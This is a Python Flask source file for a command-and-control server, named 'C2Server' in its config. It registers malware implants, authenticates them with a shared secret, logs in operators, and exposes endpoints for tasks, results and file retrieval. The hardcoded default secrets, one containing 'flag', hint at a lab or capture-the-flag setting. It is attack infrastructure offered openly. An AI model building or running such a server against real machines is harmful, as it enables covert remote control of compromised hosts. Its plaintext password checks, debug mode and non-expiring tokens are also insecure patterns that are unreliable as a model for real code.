
import os
import resources

from flask import Flask, request, jsonify
from flask_restful import Api
from database.db import initialize_db
from flask_jwt_extended import JWTManager, create_access_token
from database.models import Implant, Profile

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = os.getenv('JWT_Secret', 'super-secret-pass-5522-flag')
mongo_host = os.getenv('Mongo_Host', 'mongo')
mongo_port = os.getenv('Mongo_Port', 27017)
mongo_db = os.getenv('Mongo_DB', 'C2Server')

app.config['MONGODB_SETTINGS'] = {
    'db': mongo_db,
    'host': f'mongodb://{mongo_host}:{mongo_port}/{mongo_db}'
}

initialize_db(app)

api = Api(app)
jwt = JWTManager(app)

secretkey = os.getenv('secret_key', 'e7bcc0ba5fb1dc9cc09460baaa2a6986')

@app.route('/config', methods=['POST'])
def register():
    try:
        implantID = request.json.get('implant_id', None)

        if not implantID :
            return jsonify({"msg": "bay"}), 400
        body = request.get_json()
        findimp = Implant.objects(implant_id=str(implantID)).first()
        if findimp:
            return jsonify({"msg": "welcome again"}), 200
        imp = Implant(**body)
        imp.save()
        return jsonify({"msg": "Implant Registered"}), 200
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

@app.route('/login', methods=['POST'])
def login():
    try:
        implantID = request.json.get('implantID', None)
        secret = request.json.get('secret', None)
        if not implantID or not secret:
            return jsonify({"msg": "bay"}), 400

        imp = Implant.objects(implant_id=str(implantID)).first()
        print(imp.to_json())
        if imp and secret == secretkey:
            access_token = create_access_token(identity=implantID, expires_delta=False)
            return jsonify(access_token=access_token), 200
        else:
            return jsonify({"msg": "Invalid Token"}), 401
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

@app.route('/profile/login', methods=['POST'])
def profile_login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
        if not username or not password:
            return jsonify({"msg": "bay"}), 400

        user = Profile.objects(username=str(username)).first()

        if user and password == user.password:
            
            access_token = create_access_token(identity=username, expires_delta=False)
            return jsonify(access_token=access_token), 200
        else:
            return jsonify({"msg": "Invalid pass"}), 401
    except Exception as e:
        print(e)
        return jsonify({"msg": "bay"}), 500


api.add_resource(resources.Tasks, '/tasks', endpoint='tasks')
api.add_resource(resources.Results, '/results', endpoint='results')
api.add_resource(resources.implants, '/implants', endpoint='implants')
api.add_resource(resources.files, '/get_file', endpoint='files')

if __name__ == '__main__':
    port=int(os.getenv('Flask_Port', 5000))
    debug=bool(int(os.getenv('FLASK_DEBUG', 1)))
    host=os.getenv('FLASK_RUN_HOST', '0.0.0.0')
    app.run(port,debug,host)